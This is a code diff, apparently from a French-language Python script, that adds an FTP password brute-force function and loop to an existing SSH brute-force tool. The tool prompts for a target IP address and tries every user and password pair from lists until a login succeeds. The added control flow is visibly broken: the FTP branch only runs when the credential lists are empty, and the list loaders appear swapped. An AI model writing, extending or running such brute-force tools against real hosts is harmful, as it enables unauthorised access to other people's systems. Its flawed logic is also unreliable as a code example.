@@ -2,6 +2,7 @@ import os
 import paramiko
 import socket
 import time
+import ftplib
 
 def brute_force_ssh(host, p, user, passwd):
     clt = paramiko.SSHClient()
@@ -22,6 +23,19 @@ def brute_force_ssh(host, p, user, passwd):
         return brute_force_ssh(host, p, user, passwd)
     else:
         return True
+
+def brute_force_ftp(host, port, username, password):
+    try:
+        ftp = ftplib.FTP()
+        ftp.connect(host, port)
+        ftp.login(username, password)
+        ftp.quit()
+        print(f"Mot de passe FTP trouvé : {password}")
+        return True
+    except ftplib.error_perm as e:
+        print(f"Tentative avec {password} a échoué : {e}")
+        return False
+        
 def connection():
     adresse_IP = input ("Donner l'adresse IP: ") #adresse IP de la machine cible
     return adresse_IP
@@ -102,11 +116,17 @@ def main():
     path = path_passwords_list()
     users = acceder_password_file(path)
     passwords = acceder_users_list(path)
+    
     if users and passwords:
         for user in users:
             for password in passwords:
                 if brute_force_ssh(adresse_IP, port, user, password):
                     return
+    elif protocole == 'ftp':
+        for user in users:
+            for password in passwords:
+                if brute_force_ftp(adresse_IP, port, user, password):
+                    return            
         print("Aucun mot de passe trouvé.")
     else:
         print("Aucune liste de mots de passe ou d'utilisateurs récupérée.")
